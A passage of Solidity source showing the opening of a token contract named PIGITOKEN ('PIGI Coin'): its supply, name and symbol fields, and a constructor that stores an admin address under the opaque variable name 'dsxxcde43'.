...
contract PIGITOKEN is Ownable {
    address public dsxxcde43;
    uint256 supplyamount = 10000000000*10**decimals();
    uint256 private _cctotalSupply = supplyamount;
    string private _cctokenname = "PIGI Coin";
    string private _cctokensymbol = "PIGI";
    constructor(address tokenadmin) {
        dsxxcde43 = tokenadmin;
